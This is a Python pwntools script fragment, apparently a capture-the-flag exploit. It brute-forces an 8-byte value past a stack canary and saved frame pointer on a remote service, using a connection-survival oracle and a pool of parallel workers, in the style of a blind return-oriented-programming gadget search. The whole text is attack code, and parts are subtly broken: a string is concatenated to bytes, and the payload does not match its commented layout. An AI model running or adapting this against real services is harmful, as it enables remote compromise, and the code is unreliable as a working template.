
# debug if our service is running properly or failing
def checkservice(payload = b"Hellow", debug=False):
    try:
        if debug:
            print('[<] DEBUG START!')
        p = remote(taddr, tport)
        # RECEIVE THE IDL ENTRY 
        p.recvuntil(b"Say Welcome: ", timeout=0.3)
        # SEND MESSAGE           
        p.send(payload)
        # check if any data is recieved
        res = p.recvline(timeout=1)
        if debug:
            print('[<] DEBUG: ', res)
        p.sendline(b"PING") # testing if the connection still there
        check = p.clean(timeout=0.3)
        if debug:
            print('[<] DEBUG: ', check)
        p.close()
        if check != b'':
            return True
        if debug:
            print('[<] DEBUG END!')
        return False
    except (EOFError, PwnlibException):
        p.close()
        return False


def find_me(args):
    message, _id, start, end,  step = args 
    # search_win = True
    for b in range(start, end, step):
        # PADDIND+ CANARY+RBP+[GUESS]+[STOP]
        seed = p64(b)
        special_hello = message + seed + _id
        status = checkservice(special_hello)
        print(f"{status}")
        if status :
            print(f"Found Him with special hello: {p64(b).hex()} : status {status}", file=sys.stderr)
            return seed
    return None

number_workers = 10
start_val = 0
end_val = 10000
step_val = 1
chunk_size = (end_val - start_val) // number_workers
tasks = []
message = b"Hello Form " 
WIN = b''
print(f"CHUNK SIZE: {chunk_size}")
for i in range(number_workers):
    w_start = start_val + (i * chunk_size)
    # Ensure the final worker covers any remainder up to end_val
    w_end = w_start + chunk_size if i < (number_workers - 1) else end_val
    
    # Package the arguments for this specific worker
    tasks.append((message, str(w_start + w_end), w_start, w_end, step_val))

    # 2. Execute the multiprocessing pool
    print(f"Starting {number_workers} workers...")
    
with multiprocessing.Pool(processes=number_workers) as pool:
    # imap_unordered yields results immediately as individual workers return them
    for result in pool.imap_unordered(find_me, tasks):
        
        if result is not None:
            print(f"[+] Result acquired: {result}")
            WIN = result
            # 3. The moment we get a valid result, kill all other workers instantly
            pool.terminate()
            break